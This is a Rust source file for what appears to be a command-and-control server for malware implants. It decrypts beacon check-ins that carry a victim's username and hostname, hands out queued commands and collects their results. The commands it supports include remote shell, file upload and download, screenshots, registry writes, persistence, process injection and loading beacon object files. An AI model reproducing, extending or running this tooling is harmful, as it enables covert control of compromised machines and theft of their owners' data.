use axum::{body::Bytes, extract::State, http::{HeaderMap, StatusCode}};
use clap::Command;
use sha2::digest::Output;
use std::sync::Arc;
use serde::{Deserialize, Serialize};
use crate::{command::CommandResult, server::ServerState, session::BeaconData};
use crate::command::{CommandQueue, CommandType};


#[derive(Debug, Serialize, Deserialize)]
pub struct BeaconResponse {
    pub commands: Vec<CommandData>,
    pub interval: Option<u64>,
    pub jitter: Option<u8>,
    pub instruction: Option<String>,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct CommandData {
    pub id: String,
    #[serde(rename = "type")]
    pub command_type: String,
    pub args: Vec<String>,
    pub timeout: Option<u64>
}

#[derive(Debug, Deserialize)]
struct ResultData {
    id: String,
    command_id: String,
    result: Result<String, String>,
    timestamp: i64,
}

pub async fn beacon(State(state): State<Arc<ServerState>>, _headers: HeaderMap, body: Bytes,) -> Result<Bytes, StatusCode> {

    let decrypted = state.crypto.decrypt(&body).map_err(|_| StatusCode::BAD_REQUEST)?;

    let data: BeaconData = serde_json::from_slice(&decrypted).map_err(|_| StatusCode::BAD_REQUEST)?;

    log::debug!("Beacon donnection received from session {} ({}@{})", data.session_id, data.username, data.hostname);

    // Register/update session
    let session: crate::session::Session = state.sessions.register(&data).await.map_err(|e| {
        log::error!("Faild to register session: {}", e);
        StatusCode::INTERNAL_SERVER_ERROR
    })?;

    let commands = state.commands.pending(&session.id).await;
    // TODO: Add log beacon data and pending commands to database
    log::debug!("Session {} has {} pending commands", session.id, commands.len());

    let response = BeaconResponse {
        commands: commands.into_iter().map(|c| c.into()).collect(), interval: None, jitter: None, instruction: None};
        let response = serde_json::to_vec(&response).map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
        let encrypted = state.crypto.encrypt(&response).map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;

    Ok(Bytes::from(encrypted))
}

pub async fn result(State(state): State<Arc<ServerState>>, body: Bytes) -> Result<StatusCode, StatusCode> {
    let decrypted = state.crypto.decrypt(&body).map_err(|_| StatusCode::BAD_REQUEST)?;

    let data: ResultData = serde_json::from_slice(&decrypted).map_err(|_| StatusCode::BAD_REQUEST)?;
    log::debug!("Received result for command {} from session {}", data.command_id, data.id);

    let result = match &data.result {
        Ok(output) => CommandResult {
            id: data.id.clone(),
            output: output.clone(),
            success: true,
            duration_ms: 0,
            data: None,
        },
        Err(error) => CommandResult {
            id: data.id.clone(),
            output: error.clone(),
            success: false,
            duration_ms: 0,
            data: None,
        }
    };

    state.commands.result(&data.command_id, result.clone()).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
    // TODO: Add log command result to database

    Ok(StatusCode::OK)
}

impl From<crate::command::Command> for CommandData {
    fn from(cmd: crate::command::Command) -> Self {
        Self {
            id: cmd.id,
            command_type: match cmd.command_type {
                CommandType::Shell => "shell".to_string(),
                CommandType::Download => "download".to_string(),
                CommandType::Upload => "upload".to_string(),
                CommandType::Screenshot => "screenshot".to_string(),
                CommandType::Ps => "ps".to_string(),
                CommandType::Kill => "kill".to_string(),
                CommandType::BofLoad => "bof_load".to_string(),
                CommandType::Sysinfo => "sysinfo".to_string(),
                CommandType::Sleep => "sleep".to_string(),
                CommandType::Exit => "exit".to_string(),
                CommandType::Ls => "ls".to_string(),
                CommandType::Cd => "cd".to_string(),
                CommandType::Pwd => "pwd".to_string(),
                CommandType::Rm => "rm".to_string(),
                CommandType::Cp => "cp".to_string(),
                CommandType::Mv => "mv".to_string(),
                CommandType::RegRead => "reg_read".to_string(),
                CommandType::RegWrite => "reg_write".to_string(),
                CommandType::Persist => "persist".to_string(),
                CommandType::Inject => "inject".to_string(),
            },
            args: cmd.args,
            timeout: cmd.timeout,
        }
    }
}